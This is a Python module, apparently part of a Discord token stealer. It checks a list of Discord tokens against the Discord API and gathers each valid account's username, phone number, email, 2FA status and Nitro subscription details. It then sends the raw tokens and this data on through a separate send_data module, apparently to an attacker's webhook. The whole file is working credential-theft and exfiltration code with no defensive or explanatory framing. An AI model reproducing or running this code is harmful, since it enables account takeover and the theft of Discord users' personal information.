import requests
from DiscordHooks import Embed, EmbedField, EmbedThumbnail, Color
import datetime
from discord import send_data
languages = {
    'da': 'Danish, Denmark',
    'de': 'German, Germany',
    'en-GB': 'English, United Kingdom',
    'en-US': 'English, United States',
    'es-ES': 'Spanish, Spain',
    'fr': 'French, France',
    'hr': 'Croatian, Croatia',
    'lt': 'Lithuanian, Lithuania',
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}


def tokenValid(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    res = requests.get(
        'https://discordapp.com/api/v6/users/@me', headers=headers)
    if res.status_code == 200:
        return True
    else:
        return False


def tokenInfo(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    res = requests.get(
        'https://discordapp.com/api/v6/users/@me', headers=headers)
    res_json = res.json()
    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
    user_id = res_json['id']
    avatar_id = res_json['avatar']
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
    phone_number = res_json['phone']
    email = res_json['email']
    mfa_enabled = res_json['mfa_enabled']
    flags = res_json['flags']
    locale = res_json['locale']
    verified = res_json['verified']
    language = languages.get(locale)
    creation_date = datetime.datetime.utcfromtimestamp(
        ((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    has_nitro = False
    res = requests.get(
        'https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    days_left = 0
    if has_nitro:
        d1 = datetime.datetime.strptime(
            nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.datetime.strptime(
            nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)

    return {
        "username": user_name,
        "userid": user_id,
        "avatar": avatar_url,
        "token": token,
        "phone": phone_number,
        "email": email,
        "2fa": mfa_enabled,
        "verified": verified,
        "lang": language,
        "created": creation_date,
        "nitro": has_nitro,
        "days": days_left
    }


def validateTokens(tokens):
    validTokens = []
    for t in tokens:
        valid = tokenValid(t)
        if valid:
            validTokens.append(t)
    validTokens = list(set(validTokens))
    return validTokens


def sendTokens(tokens):
    print('sending tokens')
    vTokens = validateTokens(tokens)
    embeds = []
    for token in vTokens:
        userInfo = tokenInfo(token)
        embeds.append(Embed(
            title=userInfo['username'],
            description=f"|| `{userInfo['token']}` ||",
            timestamp=datetime.datetime.now(),
            color=Color.Orange,
            thumbnail=EmbedThumbnail(url=userInfo['avatar']),
            fields=[EmbedField(
                name='User ID',
                value=userInfo['userid'],
            ),
                EmbedField(
                name='Phone Number',
                value=userInfo['phone']
            ),
                EmbedField(
                name='Email',
                value=userInfo['email']
            ),
                EmbedField(
                name='Created',
                value=userInfo['created']
            ),
                EmbedField(
                name='Language',
                value=userInfo['lang']
            ),
                EmbedField(
                name='Verified',
                value=str(userInfo['verified'])
            ),
                EmbedField(
                name='Has Nitro', 
                value=str(userInfo['nitro'])
                ),
                EmbedField(
                name='Nitro Days Left', 
                value=str(userInfo['days']) + ' Days'
                ),
            ]
        ))
    # print(embeds)
    s = send_data.sendData(embeds)
    if s:
        print('success')
    else:
        print('failes')


